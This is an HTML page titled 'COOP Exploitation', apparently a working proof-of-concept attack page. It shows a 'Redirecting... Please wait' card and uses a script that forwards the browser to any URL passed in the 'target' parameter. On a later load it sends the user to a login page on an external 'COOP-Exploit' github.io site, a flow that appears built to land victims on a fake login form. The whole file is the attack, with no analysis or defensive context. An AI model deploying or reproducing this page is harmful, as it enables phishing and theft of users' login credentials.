<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>COOP Exploitation</title>
    <style>
        body {
            background-color: white;
            width: 100%;
            height: 100vh;
            margin: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            font-family: Arial, sans-serif;
        }
        .loader {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #007bff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .redirect-container {
            background: white;
            padding: 20px 30px;
            border-radius: 8px;
            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.15);
            width: 400px;
            text-align: center;
        }
        .message {
            margin-top: 15px;
            font-size: 18px;
            color: #333;
        }
        .secondary-message {
            margin-top: 15px;
            font-size: 14px;
            color: #666;
        }
        .manual-link {
            color: #007bff;
            text-decoration: none;
            font-weight: bold;
        }
    </style>
    <script type="text/javascript">
        function getTargetParam() {
            const params = new URLSearchParams(window.location.search);
            return params.get("target") ? decodeURIComponent(params.get("target")) : null;
        }

        function redirectToTarget() {
            const target = getTargetParam();
            if (!target) {
                console.error("No target parameter found. Aborting redirection.");
                return;
            }

            console.log(`Redirecting to: ${target}`);
            window.location.href = target;

            // Store the flag in sessionStorage to remember that we redirected
            sessionStorage.setItem("redirected", "true");
        }

        function redirectToLogin() {
            console.log("Redirecting to login.html...");
            window.location.href = "https://sp3ttr0.github.io/COOP-Exploit/login.html";
        }

        function setup() {
            if (sessionStorage.getItem("redirected")) {
                // If the page was redirected before, now go to login.html
                sessionStorage.removeItem("redirected"); // Clean up the flag
                redirectToLogin();
            } else {
                setTimeout(redirectToTarget, 2000); // Redirect to target after 2 seconds
            }
        }

        window.onload = setup;
    </script>
</head>
<body>
    <div class="redirect-container">
        <div class="loader"></div>
        <p class="message">Redirecting... Please wait.</p>
        <p class="secondary-message">
            If the site does not redirect, <a class="manual-link" href="#" id="manual-redirect">click here</a>.
        </p>
    </div>
</body>
</html>
